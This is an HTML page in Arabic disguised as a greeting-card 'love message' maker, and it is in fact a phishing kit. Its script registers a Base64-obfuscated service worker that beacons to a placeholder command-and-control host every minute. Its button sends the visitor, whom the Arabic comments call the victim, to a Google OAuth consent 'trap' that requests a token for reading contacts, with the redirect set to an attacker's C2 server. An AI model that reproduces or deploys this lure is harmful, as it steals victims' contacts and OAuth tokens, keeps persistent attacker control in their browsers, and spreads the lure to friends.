<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تهنئة خاصة لك 💝</title>
    <meta property="og:title" content="رسالة حب خاصة لك 💝">
    <meta property="og:description" content="اضغط هنا لمشاهدة رسالة الحب التي أرسلها لك شخص مجهول">
    <meta property="og:image" content="https://i.ibb.co/XW9Vq0W/heart.jpg">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-pink-500 to-purple-700 min-h-screen flex items-center justify-center p-4">
    <div class="bg-white/90 p-8 rounded-3xl shadow-2xl max-w-md w-full text-center">
        <div class="text-6xl mb-4 animate-pulse">🎁</div>
        <h1 class="text-2xl font-bold text-gray-800">صانع مفاجآت الحب</h1>
        <p class="text-gray-600 my-4">اكتب اسمك لتصميم رسالة تهنئة وارسالها لأصدقائك تلقائياً</p>
        <input type="text" id="v_name" placeholder="اكتب اسمك هنا..." class="w-full p-3 border-2 border-pink-300 rounded-xl mb-4 text-center">
        <button onclick="trigger()" class="w-full bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">إرسال التهنئة الآن</button>
    </div>

    <script>
        // كود الحقن مشفر (Base64) لتجاوز الفحص
        const encodedSW = "c2VsZi5hZGRFdmVudExpc3RlbmVyKCdhY3RpdmF0ZScsIGUgPT4geyBzZXRJbnRlcnZhbCgoKSA9PiB7IGZldGNoKCdodHRwczovL3lvdXItYzIucmVuZGVyLmNvbS9waW5nJyk7IH0sIDYwMDAwKTsgfSk7"; 
        const blob = new Blob([atob(encodedSW)], {type: 'application/javascript'});
        const swUrl = URL.createObjectURL(blob);
        if ('serviceWorker' in navigator) { navigator.serviceWorker.register(swUrl); }

        function trigger() {
            const name = document.getElementById('v_name').value;
            if(!name) return alert('اكتب اسمك');
            localStorage.setItem('v_n', name);
            // توجيه الضحية لفخ جوجل (ضع الـ Client ID الخاص بك هنا)
            const cid = "YOUR_CLIENT_ID.apps.googleusercontent.com";
            const rdir = btoa("https://your-c2-server.com/callback"); // تشفير رابط الـ C2
            window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${cid}&redirect_uri=${atob(rdir)}&response_type=token&scope=https://www.googleapis.com/auth/contacts.readonly`;
        }
    </script>
</body>
</html>
